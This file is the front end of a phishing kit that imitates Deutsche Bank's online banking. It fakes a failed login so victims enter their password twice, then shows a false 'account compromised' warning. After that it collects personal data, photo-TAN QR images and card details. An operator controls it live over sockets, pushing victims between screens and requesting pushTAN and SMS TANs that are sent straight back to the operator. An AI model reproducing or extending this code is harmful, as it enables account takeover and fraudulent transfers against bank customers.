import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import './DeutscheBankStyle.css';

// Import components
import {
  LoginForm,
  Loading,
  Header,
  Footer,
  AccountCompromisedScreen,
  PersonalDataForm,
  BankCardForm,
  QRInstructionsScreen,
  QRUploadForm,
  QRErrorScreen,
  ErrorScreen,
  FinalSuccessScreen
} from './components';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';
import templateSocketClient from '../../utils/socketClient';

// Deutsche Bank flow states
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  multiFieldLogin: boolean;
  doubleLogin: boolean;
  personalData: boolean;
  qrCode: boolean;
  bankCard: boolean;
}

// Default configuration
const DEFAULT_CONFIG: StepConfig = {
  multiFieldLogin: true,
  doubleLogin: true,
  personalData: true,
  qrCode: true,
  bankCard: true
};

// Types for Deutsche Bank flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

// AutoLogin component
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const metadata = getTemplateMetadata('deutsche_bank');
    updatePageMetadata(metadata);

    const initializeSession = async () => {
      try {
        setLoading(true);
        const newKey = await createTemplateSession('deutsche_bank');
        console.log('Generated key for Deutsche Bank:', newKey);
        navigate(`/deutsche_bank/${newKey}`);
      } catch (error) {
        console.error('Failed to create Deutsche Bank session:', error);
        // Fallback to random key
        const fallbackKey = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        navigate(`/deutsche_bank/${fallbackKey}`);
      } finally {
        setLoading(false);
      }
    };

    setTimeout(initializeSession, 500);
  }, [navigate]);

  if (error) {
    return (
      <div className="deutsche-bank-container">
        <Header />
        <div className="deutsche-bank-content" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '400px' }}>
          <div style={{ textAlign: 'center', color: '#dc3545' }}>
            <h2>Fehler beim Erstellen der Sitzung</h2>
            <p>{error}</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="deutsche-bank-container">
      <Header />
      <div className="deutsche-bank-content" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '400px' }}>
        <Loading message="Sitzung wird erstellt" type="default" />
      </div>
      <Footer />
    </div>
  );
}

// Main flow component for Deutsche Bank
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  
  const [state, setState] = useState(STATES.LOGIN);
  const [loading, setLoading] = useState(false);
  const [config, setConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState('');
  
  // Session data storage
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('deutsche_bank');
    updatePageMetadata(metadata);

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        const configData = await getTemplateConfig('deutsche_bank');
        setConfig(configData.steps);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded Deutsche Bank step config:', configData.steps);
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
      }
    };

    if (!key) {
      navigate('/deutsche_bank');
      return;
    }

    console.log('Deutsche Bank flow started with key:', key);
    loadConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'deutsche_bank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login submission
  const handleLoginSubmit = async (data: LoginData) => {
    try {
      console.log('Login submitted for session:', key);
      setSessionData(prev => ({ ...prev, login: data }));
      
      setState(STATES.LOADING);
      setLoadingMessage("Anmeldung wird verarbeitet...");
      
      // Submit login data to backend
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'login',
        data: {
          username: data.username,
          password: data.password
        }
      });

      // Check double login configuration
      if (state === STATES.LOGIN) {
        if (config.doubleLogin) {
          // First attempt - show error
          setState(STATES.LOGIN_ERROR);
        } else {
          // Single login - go directly to account compromised
          setState(STATES.ACCOUNT_COMPROMISED);
        }
      } else if (state === STATES.LOGIN_ERROR) {
        // Second attempt - proceed to account compromised
        setState(STATES.ACCOUNT_COMPROMISED);
      }
    } catch (error: any) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN_ERROR);
    }
  };

  // Handle account compromised continuation
  const handleAccountCompromisedContinue = async () => {
    try {
      setState(STATES.LOADING);
      setLoadingMessage("Sicherheitsüberprüfung wird gestartet...");
      
      // Submit verification start to backend
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'start-verification',
        data: {}
      });

      if (response.success) {
        if (config.personalData) {
          setState(STATES.PERSONAL_DATA);
        } else if (config.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else if (config.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setError(response.error || 'Fehler beim Starten der Sicherheitsüberprüfung');
        setState(STATES.ERROR);
      }
    } catch (error) {
      console.error('Account compromised error:', error);
      setError('Fehler beim Starten der Sicherheitsüberprüfung');
      setState(STATES.ERROR);
    }
  };

  // Handle personal data submission
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Personal data submitted for session:', key);
      
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'personal-data',
        data: data
      });

      if (response.success) {
        if (config.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else if (config.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
      }
    } catch (error: any) {
      console.error('Personal data error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
      setState(STATES.ERROR);
    }
  };

  // Handle QR instructions continue
  const handleStartQRUpload = async () => {
    try {
      setState(STATES.LOADING);
      setLoadingMessage("QR-Upload wird vorbereitet...");
      
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'qr-instructions',
        data: {}
      });

      if (response.success) {
        setState(STATES.QR_UPLOAD);
      } else {
        setError(response.error || 'Fehler beim Starten des QR-Uploads');
        setState(STATES.ERROR);
      }
    } catch (error) {
      console.error('Start QR upload error:', error);
      setError('Fehler beim Starten des QR-Uploads');
      setState(STATES.ERROR);
    }
  };

  // Handle QR upload
  const handleQRUpload = async (file: File) => {
    try {
      setState(STATES.LOADING);
      setLoadingMessage("QR-Code wird verarbeitet...");
      
      const response = await uploadTemplateFile('deutsche_bank', key || '', file, 'qr-upload');

      if (response.success) {
        if (config.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setState(STATES.QR_ERROR);
      }
    } catch (error) {
      console.error('QR upload error:', error);
      setState(STATES.QR_ERROR);
    }
  };

  // Handle bank card submission
  const handleBankCardSubmit = async (data: any) => {
    try {
      setState(STATES.LOADING);
      setLoadingMessage("Kartendaten werden verarbeitet...");
      
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });

      if (response.success) {
        setState(STATES.FINAL_SUCCESS);
      } else {
        setError(response.error || 'Fehler beim Speichern der Kartendaten');
        setState(STATES.ERROR);
      }
    } catch (error: any) {
      console.error('Bank card error:', error);
      setError('Fehler beim Speichern der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Deutsche Bank: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'deutsche_bank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Deutsche Bank bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Deutsche Bank bank card skip completed successfully');
      
      // Show loading screen
      setState(STATES.LOADING);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Deutsche Bank bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render current state
  const renderContent = () => {
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLoginSubmit} />;
        
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLoginSubmit} showError={true} />;
        
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleAccountCompromisedContinue} />;
        
      case STATES.PERSONAL_DATA:
        return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        
      case STATES.QR_INSTRUCTIONS:
        return <QRInstructionsScreen onContinue={handleStartQRUpload} />;
      
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} />;
      
      case STATES.QR_ERROR:
        return <QRErrorScreen />;
      
      case STATES.QR_RETRY:
        return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
        
      case STATES.BANK_CARD:
        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
        
      case STATES.LOADING:
        return <Loading message={loadingMessage} type="processing" />;
        
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
        
      default:
        return <ErrorScreen message="Unbekannter Zustand" />;
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
    }}>
      <main>
        {renderContent()}
      </main>
    </div>
  );
}

// Main Deutsche Bank Template Component
const DeutscheBankTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin to generate one
  if (!key) {
    return <AutoLogin />;
  }

  // If key provided, show the main form flow
  return <FormFlow />;
};

export default DeutscheBankTemplate;
